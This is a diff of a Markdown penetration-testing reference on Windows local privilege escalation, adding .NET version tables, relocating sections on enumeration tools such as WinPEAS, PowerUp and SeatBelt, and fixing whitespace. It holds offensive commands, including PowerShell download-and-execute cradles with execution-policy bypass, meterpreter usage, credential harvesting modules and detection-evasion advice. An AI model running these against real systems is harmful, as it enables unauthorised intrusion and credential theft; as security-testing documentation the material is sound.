@@ -40,31 +40,81 @@ current system:
 
 ###### Installed .NET framework
 
-A number of tools may require the use of .NET, either for privileges escalation
-or post exploitation.
+A number of tools may require the use of the `.NET Framework`, either for
+privileges escalation or post exploitation. The `.NET Framework 4.8` will be
+the last version released of the `.NET Framework` (only security updates and
+reliability hotfixes will follow).
 
-Before .NET 4.0, the installed .NET version can be determined using the
-names of the folder in the `\Windows\Microsoft.NET\Framework64\` directory. For
-later versions, the `MSBuild.exe` utility, packaged with the .NET  framework,
-can be used to establish the precise version installed. If the execution of
+Each version of the `.NET Framework` contains the
+`Common Language Runtime (CLR)`, used to execute `managed code` of `.NET`
+programs. A `.NET` programs should be build to target the `CLR` version
+associated with the `.NET Framework` installed on the (targeted) host. For
+instance, an utility can be build to target the `.NET Framework 4.8` even if
+only the `.NET Framework 4` is installed on the host the utility will be
+executed on.
+
+| .NET Framework version | CLR version |
+|------------------------|-------------|
+| `.NET Framework 2.0` <br> `.NET Framework 3.0` <br> `.NET Framework 3.5` | 2 |
+| `.NET Framework 4` <br> `.NET Framework 4.5 - 4.8` | 4 |
+
+The `.NET Framework` is installed by default on Windows, with
+[a version depending on the Windows version](https://docs.microsoft.com/en-us/dotnet/framework/migration-guide/versions-and-dependencies):
+
+| Windows version / build | .NET Framework version |
+|-------------------------|------------------------|
+| `Windows Server 2022` | `.NET Framework 4.8` |
+| `Windows 11` | `.NET Framework 4.8` |
+| `Windows 10 (build 1903+)` | `.NET Framework 4.8` <br> `.NET Framework 3.5 SP1`* |
+| `Windows Server 2019` <br> `Windows Server version 1803 / 1809` | `.NET Framework 4.7.2` |
+| `Windows 10 (build 1803 / 1809)` | `.NET Framework 4.7.2` <br> `.NET Framework 3.5 SP1`* |
+| `Windows Server version 1709` | `.NET Framework 4.7.1` |
+| `Windows 10 (build 1709)` | `.NET Framework 4.7.1` <br> `.NET Framework 3.5 SP1`* |
+| `Windows 10 (build 1703)` | `.NET Framework 4.7` <br> `.NET Framework 3.5 SP1`* |
+| `Windows Server 2016` | `.NET Framework 4.6.2` |
+| `Windows 10 (build 1607)` | `.NET Framework 4.6.2` <br> `.NET Framework 3.5 SP1`* |
+| `Windows 10 (build 1511)` | `.NET Framework 4.6.1` <br> `.NET Framework 3.5 SP1`* |
+| `Windows 10 (build 1507)` | `.NET Framework 4.6.0` <br> `.NET Framework 3.5 SP1`* |
+| `Windows Server 2012 R2` | `.NET Framework 4.5.1` <br> `.NET Framework 3.5 SP1`* |
+| `Windows Server 2012` | `.NET Framework 4.5` <br> `.NET Framework 3.5 SP1`* |
+| `Windows 8.1` | `.NET Framework 4.5.1` <br> `.NET Framework 3.5 SP1`* |
+| `Windows 8` | `.NET Framework 4.5` <br> `.NET Framework 3.5 SP1`* |
+| `Windows 7` | `.NET Framework 3.5.1` |
+| `Windows Server 2008 R2` | `.NET Framework 3.5.1` |
+| `Windows Server 2008 SP2` | `.NET Framework 3.0 SP2`* <br> `.NET Framework 2.0 SP1` |
+| `Windows Server 2008` <br> `Windows Server 2008 SP1` | `.NET Framework 3.0 SP1`* <br> `.NET Framework 2.0 SP1` |
+| `Windows Vista SP1` | `.NET Framework 3.0 SP1`* <br> `.NET Framework 2.0 SP1` |
+| `Windows Vista` | `.NET Framework 3.0`* <br> `.NET Framework 2.0` |
+| `Windows Server 2003 (x86)` | `.NET Framework 2.0` <br> `.NET Framework 1.1` |
+
+**The `.NET Framework` version must be enabled (either through the
+`Control Panel` or, for Windows Server, through the `Server Manager`).*
+
+The version of the `.NET Framework` framework installed can be determined
+through registry key entries. Additionally, before `.NET Framework 4.0`, the
+installed `.NET Framework` version can be determined using the names of the
+folder in the `\Windows\Microsoft.NET\Framework64\` directory. For later
+versions, the `MSBuild.exe` utility, packaged with the `.NET` framework, can be
+used to establish the precise version installed. If the execution of
 `MSBuild.exe` is blocked, the version can still be retrieved manually.
 
 ```
-cd \Windows\Microsoft.NET\Framework64\v4.0.30319
-.\MSBuild.exe
-
-# .NET 4.5 and later
-# The "Release" DWORD key corresponds to the particular version of the .NET Framework installed
+# .NET 4.5 and later.
+# The "Release" DWORD key corresponds to the particular version of the .NET Framework installed.
 # Values of the Release DWORD: https://github.com/dotnet/docs/blob/master/docs/framework/migration-guide/how-to-determine-which-versions-are-installed.md
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"
 
-# .NET 1.1 through 3.5
-# List all install versions (subkeys under NDP)
+# Alternatively the MSBuild.exe utility can be used instead of directly quering the registry.
+cd \Windows\Microsoft.NET\Framework64\v4.0.30319
+.\MSBuild.exe
+
+# .NET 1.1 through 3.5.
+# List all install versions (subkeys under NDP).
 reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\
 # Retrieve the "Version" key of the specified .NET installation
 reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\<VERSION>
 
-# Alternative .NET all versions
+# Alternative for .NET all versions.
 # The "FileVersion" property of the .NET installation dlls can be used to determine, through a Google search query, the precise installed version
 cd \Windows\Microsoft.NET\Framework64\<VERSION>
 Get-Item "Accessibility.dll" | fl
@@ -77,7 +127,7 @@ $file = Get-Item "Accessibility.dll"
 
 Before attempting a local privilege escalation, notably in a covert scenario,
 establishing a precise vision on the system security defense and supervision
-mechanisms may help evade detection.  
+mechanisms may help evade detection.
 
 ###### Antivirus product
 
@@ -95,7 +145,7 @@ Note that some `Endpoint Detection and Response (EDR)` solutions may not be
 registered in the `SecurityCenter` and can only be detected by listing the
 running processes or configured services.
 
-```
+```bash
 # SecurityCenter: Windows 2000, Windows Server 2003, Windows XP, and older
 # SecurityCenter2: Windows Vista, Windows Server 2008, or newer
 
@@ -142,7 +192,7 @@ importance, as a process command line arguments may yield information about a
 tool function, compromised accounts or C2 servers, and be very able for the
 blue team.
 
-```
+```bash
 reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit"
 
 # "ProcessCreationIncludeCmdLine_Enabled: 0x1" = the command line is logged in process creation
@@ -157,9 +207,9 @@ the chosen event logs to a `Windows Event Collector (WEC)` server, for back up
 or security monitoring.
 
 The following registry key can be queried to retrieve information about a
-possible `WEF` subscription:  
+possible `WEF` subscription:
 
-```
+```bash
 reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
 ```
 
@@ -176,7 +226,7 @@ cmdlet.
 Note that the `appidsvc` service must be running for `AppLocker` to be
 functional.
 
-```
+```bash
 Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
 
 # Configured AppLocker rules, stored in XML format
@@ -200,7 +250,7 @@ Additionally, the presence and size of the event logs hive
 `Microsoft-Windows-AppLocker/EXE and DLL` can also be a good indicator of
 whether or not `AppLocker` is enabled. If the log file is not present or is
 empty (the evtx file has a size of 68 Ko / 69 632 bytes) then `AppLocker` may
-not have been enabled and configured on the system.  
+not have been enabled and configured on the system.
 
 ```
 dir C:\Windows\System32\winevt\Logs | findstr /i AppLocker
@@ -208,101 +258,6 @@ dir C:\Windows\System32\winevt\Logs | findstr /i AppLocker
 
 For more information about `AppLocker`, refer to the
 `Windows - Bypass AppLocker` note.
-
-### Enumeration scripts
-
-Most of the enumeration process detailed below can be automated using scripts.
-
-*Personal preference: PEASS's `WinPEAS.exe` or `WinPEAS.bat` + PowerSploit's
-`PowerUp.ps1` `Invoke-PrivescAudit` / `Invoke-AllChecks` + off-target
-`Windows Exploit Suggester - Next Generation`*
-
-To upload the scripts on the target, please refer to the `[General] File
-transfer` note.
-
-Note that PowerShell scripts can be injected directly into memory using
-PowerShell `DownloadString` or through a `meterpreter` session:
-
-```
-powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('<URL_PS1>'); <Invoke-CMD>"
-
-PS> IEX (New-Object Net.WebClient).DownloadString('<URL_PS1>')
-PS> <Invoke-CMD>
-
-meterpreter> load powershell
-meterpreter> powershell_import <PS1_FILE_PATH>
-meterpreter> powershell_execute <Invoke-CMD>
-```
-
-###### Privilege Escalation Awesome Scripts SUITE (PEASS) - WinPEAS
-
-`WinPEAS` checks the local privilege escalation vectors defined in the
-following checklist:
-`https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation`.
-
-Note that the `winPEAS.exe` executable requires the .NET 4.0 framework to
-function. Alternatively, the `winPEAS.bat` script may be used instead (with no
-coloring support and less optimization).
-
-```
-# All checks with out resource throttling
-# Additionally specify "notcolor" to avoid formatting errors if ANSI coloring is not supported
-winPEAS.exe cmd searchall searchfast
-
-winPEAS.bat
-```
-
-###### PowerSploit's PowerUp
-
-The PowerSploit's PowerUp `Invoke-PrivescAudit` / `Invoke-AllChecks` and
-enjoiz's `privesc.bat` or `privesc.ps1`scripts run a number of configuration
-checks:
-  - Clear text passwords in files or registry  
-  - Unquoted services path
-  - Weak services permissions
-  - "AlwaysInstallElevated" policy
-  - Token privileges
-  - ...
-
-The `Invoke-PrivescAudit` / `Invoke-AllChecks` cmdlets will run all the checks
-implemented by PowerSploit's `PowerUp.ps1`. The script can be either injected
-directly into memory as specified above or can be imported using the file.
-
-Note that `PowerUp` is not actively maintained in the master branch of the
-`PowerShellMafia`'s `PowerSploit` GitHub repository.
-
-```
-# powershell.exe -nop -exec bypass
-# set-executionpolicy bypass
-
-Import-Module <FULLPATH>\PowerUp.ps1
-
-# Older versions
-Invoke-AllChecks
-
-Invoke-PrivescAudit
-```
-
-###### enjoiz privesc.bat / privesc.ps1
-
-Both the batch and PowerShell versions of the `enjoiz` privilege escalation
-script require `accesschk.exe` to present on the targeted machine (on the
-script directory). The script takes one or multiple user group(s) as parameter
-to test the configuration for. To retrieve the user groups of the compromised
-user, the Windows built-in `whoami /groups` can be used.
-
-```
-privesc.bat "<USER_GROUP_1>" ["<USER_GROUP_N"]
-
-privesc.bat "Everyone Users" "Authenticated Users"
-```   
-
-###### Windows Exploit Suggester - Next Generation
-
-The `WES-NG` script compares a targets patch levels against the Microsoft
-vulnerability database in order to detect potential missing patches on the
-target. Refer to the `Unpatched system` section below for a detailed usage
-guide of the script.  
 
 ###### Seatbelt
 
@@ -313,7 +268,7 @@ rules, installed patches and last reboot events, etc.
 
 `Seatbelt` can also be used to gather interesting user data such as saved RDP
 connections files and putty SSH host keys, AWS/Google/Azure cloud credential
-files, browsers bookmarks and histories, etc.   
+files, browsers bookmarks and histories, etc.
 
 ```
 # Currently available (last update 20210511) SeatBelt commands  (+ means remote usage is supported):
@@ -422,8 +377,46 @@ files, browsers bookmarks and histories, etc.
       WMIFilterBinding       - Lists WMI Filter to Consumer Bindings
     + WSUS                   - Windows Server Update Services (WSUS) settings, if applicable
 
-# Conduct system + user checks, with fully detailed results
+
+# Executes the specified module(s).
 SeatBelt.exe <Command> [Command2] [-full]
+
+# Conducts "user" checks, executing the following modules:
+# Certificates, ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum,
+# dir, DpapiMasterKeys, Dsregcmd,
+# ExplorerMRUs, ExplorerRunCommands,
+# FileZilla, FirefoxPresence,
+# IdleTime, IEFavorites, IETabs, IEUrls
+# KeePass,
+# MappedDrives
+# OfficeMRUs, OracleSQLDeveloper,
+# PowerShellHistory, PuttyHostKeys, PuttySessions,
+# RDCManFiles, RDPSavedConnections,
+# SecPackageCreds, SlackDownloads, SlackPresence, SlackWorkspaces, SuperPutty,
+# TokenGroups,
+# WindowsCredentialFiles, WindowsVault
+SeatBelt.exe -group=user [-full]
+
+# Conducts "system" checks, executing the following modules:
+# AMSIProviders, AntiVirus, AppLocker, ARPTable, AuditPolicies, AuditPolicyRegistry, AutoRuns,
+# Certificates, CredGuard,
+# DNSCache, DotNet,
+# EnvironmentPath, EnvironmentVariables,
+# Hotfixes,
+# InterestingProcesses, InternetSettings,
+# LAPS, LastShutdown, LocalGPOs, LocalGroups, LocalUsers, LogonSessions, LSASettings,
+# McAfeeConfigs,
+# NamedPipes, NetworkProfiles, NetworkShares, NTLMSettings,
+# OSInfo,
+# PoweredOnEvents, PowerShell, Processes, PSSessionSettings,
+# RDPSessions, RDPsettings,
+# SCCM, Services, Sysmon,
+# TcpConnections, TokenPrivileges,
+# UAC, UdpConnections, UserRightAssignments,
+# WindowsAutoLogon, WindowsDefender, WindowsEventForwarding, WindowsFirewall, WMIEventConsumer, WMIEventFilter, WMIFilterBinding, WSUS
+Seatbelt.exe -group=system
+
+# Executes all checks, with fully detailed results.
 SeatBelt.exe -group=all [-full]
 
 # Executes SeatBelt from memory (as a gzip-compressed and base64-encoded .Net assembly loaded in PowerShell).
@@ -431,6 +424,101 @@ SeatBelt.exe -group=all [-full]
 IEX(New-Object Net.WebClient).DownloadString("http://<HOSTNAME | IP>[:<PORT>]/<SCRIPT>")
 Invoke-Seatbelt -Command "<Command> [Command2] [-full]"
 ```
+
+### Local privilege escalation enumeration scripts
+
+Most of the enumeration process detailed below can be automated using scripts.
+
+*Personal preference: PEASS's `WinPEAS.exe` or `WinPEAS.bat` + PowerSploit's
+`PowerUp.ps1` `Invoke-PrivescAudit` / `Invoke-AllChecks` + off-target
+`Windows Exploit Suggester - Next Generation`*
+
+To upload the scripts on the target, please refer to the `[General] File
+transfer` note.
+
+Note that PowerShell scripts can be injected directly into memory using
+PowerShell `DownloadString` or through a `meterpreter` session:
+
+```
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('<URL_PS1>'); <Invoke-CMD>"
+
+PS> IEX (New-Object Net.WebClient).DownloadString('<URL_PS1>')
+PS> <Invoke-CMD>
+
+meterpreter> load powershell
+meterpreter> powershell_import <PS1_FILE_PATH>
+meterpreter> powershell_execute <Invoke-CMD>
+```
+
+###### Privilege Escalation Awesome Scripts SUITE (PEASS) - WinPEAS
+
+`WinPEAS` checks the local privilege escalation vectors defined in the
+following checklist:
+`https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation`.
+
+Note that the `winPEAS.exe` executable requires the .NET 4.0 framework to
+function. Alternatively, the `winPEAS.bat` script may be used instead (with no
+coloring support and less optimization).
+
+```
+# All checks with out resource throttling
+# Additionally specify "notcolor" to avoid formatting errors if ANSI coloring is not supported
+winPEAS.exe cmd searchall searchfast
+
+winPEAS.bat
+```
+
+###### PowerSploit's PowerUp
+
+The PowerSploit's PowerUp `Invoke-PrivescAudit` / `Invoke-AllChecks` and
+enjoiz's `privesc.bat` or `privesc.ps1`scripts run a number of configuration
+checks:
+  - Clear text passwords in files or registry
+  - Unquoted services path
+  - Weak services permissions
+  - "AlwaysInstallElevated" policy
+  - Token privileges
+  - ...
+
+The `Invoke-PrivescAudit` / `Invoke-AllChecks` cmdlets will run all the checks
+implemented by PowerSploit's `PowerUp.ps1`. The script can be either injected
+directly into memory as specified above or can be imported using the file.
+
+Note that `PowerUp` is not actively maintained in the master branch of the
+`PowerShellMafia`'s `PowerSploit` GitHub repository.
+
+```
+# powershell.exe -nop -exec bypass
+# set-executionpolicy bypass
+
+Import-Module <FULLPATH>\PowerUp.ps1
+
+# Older versions
+Invoke-AllChecks
+
+Invoke-PrivescAudit
+```
+
+###### enjoiz privesc.bat / privesc.ps1
+
+Both the batch and PowerShell versions of the `enjoiz` privilege escalation
+script require `accesschk.exe` to present on the targeted machine (on the
+script directory). The script takes one or multiple user group(s) as parameter
+to test the configuration for. To retrieve the user groups of the compromised
+user, the Windows built-in `whoami /groups` can be used.
+
+```
+privesc.bat "<USER_GROUP_1>" ["<USER_GROUP_N"]
+
+privesc.bat "Everyone Users" "Authenticated Users"
+```
+
+###### Windows Exploit Suggester - Next Generation
+
+The `WES-NG` script compares a targets patch levels against the Microsoft
+vulnerability database in order to detect potential missing patches on the
+target. Refer to the `Unpatched system` section below for a detailed usage
+guide of the script.
 
 ### Physical access privileges escalation
 
@@ -444,7 +532,7 @@ Physical access open up different ways to bypass user login screen and obtain
 The methods detailed below require to boot from a live CD/DVD or USB key. The
 possibility to do so may be disabled by BIOS settings. To conduct the
 attack below, an access to the BIOS or a reset to default settings must be
-accomplished.  
+accomplished.
 
 Manufacturers may have defined a default BIOS password, some of which are
 listed on the following resource
@@ -452,7 +540,7 @@ http://www.uktsupport.co.uk/reference/biosp.htm
 
 Ultimately, BIOS settings can be reseted by removing the CMOS battery or using
 the motherboard Jumper. The system hard drive can also be plugged on another
-computer to extract the SAM base or carry out the process below.  
+computer to extract the SAM base or carry out the process below.
 
 *Encrypted disk*
 
@@ -470,7 +558,7 @@ The procedure to create a bootable USB key and reset local Windows users
 passwords is as follow:
 
   1. Download `Rufus` and `PCUnlocker`
-  2. Create a bootable USK key using `Rufus` with the `PCUnlocker` ISO.  
+  2. Create a bootable USK key using `Rufus` with the `PCUnlocker` ISO.
      If making an USB key for a computer with UEFI BIOS, pick the "GPT partition
      scheme for UEFI computer" option on Rufus
   3. Boot on the USB Key thus created (boot order may need to be changed in
@@ -479,7 +567,7 @@ passwords is as follow:
      button to reset the password to <PASSWORD>
 
 To create a bootable CD/DVD, simply use any CD/DVD burner with the `PCUnlocker`
-ISO and follow steps 3 & 4.  
+ISO and follow steps 3 & 4.
 If used on a Domain Controller, `PCUnlocker` can be used to reset Domain users
 password by updating the `ntds.dit` file.
 
@@ -595,7 +683,7 @@ Exploitation` note for more information on how to retrieve these credentials.
 
 However, stored generic credentials may be directly usable. In particular,
 Windows credentials (domain or local accounts) cached as generic credentials in
-the Credential Manager, usually done using `runas /savecred`.   
+the Credential Manager, usually done using `runas /savecred`.
 
 The `cmdkey` and `rundll32.exe` Windows built-ins can be used to enumerate the
 generic credentials stored on the machine. Saved Windows credentials be can used
@@ -855,12 +943,12 @@ assessed --
 
 The `windows-exploit-suggester` script compares a targets patch levels against
 the Microsoft vulnerability database in order to detect potential missing
-patches on the target.  
+patches on the target.
 It also notifies the user if there are public exploits and `Metasploit` modules
-available for the missing bulletins.  
+available for the missing bulletins.
 It requires the `systeminfo` command output from a Windows host in order to
 compare that the Microsoft security bulletin database and determine the patch
-level of the host.  
+level of the host.
 It has the ability to automatically download the security bulletin database
 from Microsoft with the --update flag, and saves it as an Excel spreadsheet.
 
@@ -1325,20 +1413,20 @@ Get-ACL <BINARY_PATH | FOLDER_PATH> | Format-List
 
 When a service path is unquoted, the Service Manager will try to find the
 service binary in the shortest path, moving up to the longest path until one
-works.     
+works.
 For example, for the path C:\TEST\Service Folder\binary.exe, the space
 is treated as an optional path to explore for that service. The resolution
 process will first look into C:\TEST\ for the Service.exe binary and, if it
-exist, use it to start the service.  
+exist, use it to start the service.
 
 Here is Windows’ chain of thought for the above example:
 
-1. Are they asking me to run  
-   "C:\TEST\Service.exe" Folder\binary.exe  
+1. Are they asking me to run
+   "C:\TEST\Service.exe" Folder\binary.exe
    No, it does not exist.
 
-2. Are they asking me to run  
-   "C:\TEST\Service Folder\Service_binary.exe"  
+2. Are they asking me to run
+   "C:\TEST\Service Folder\Service_binary.exe"
    Yes, it does exist.
 
 In summary, a service is vulnerable if the path to the executable contains
@@ -1387,7 +1475,7 @@ On Windows XP SP0 and SP1, the Windows service `upnphost` is run by
 all `Authenticated Users`, meaning all authenticated users on the system can
 fully modify the service configuration. Du to the End-of-Life status of the
 Service Pack affected, the vulnerability will not be fixed and can be used as
-an universal privileges escalation method on Windows XP SP0 & SP1.  
+an universal privileges escalation method on Windows XP SP0 & SP1.
 
 ```
 # accesschk.exe -uwcqv "Authenticated Users" *
@@ -1427,7 +1515,7 @@ The C code above can be compiled on Linux using the  cross-compiler `mingw`
 *Reverse shell*
 
 The service can be leveraged to start a privileged reverse shell. Refer to the
-`[General] Shells - Binary` note.  
+`[General] Shells - Binary` note.
 
 ###### Service restart
 
@@ -1483,7 +1571,7 @@ Get-WMIObject Win32_StartupCommand -NameSpace "root\CIMV2"
 ```
 
 The commands below can be chained to filter the enabled scheduled tasks name and
-action for `NT AUTHORITY\SYSTEM`, `Administrator` or the specified user:   
+action for `NT AUTHORITY\SYSTEM`, `Administrator` or the specified user:
 
 ```
 # Windows
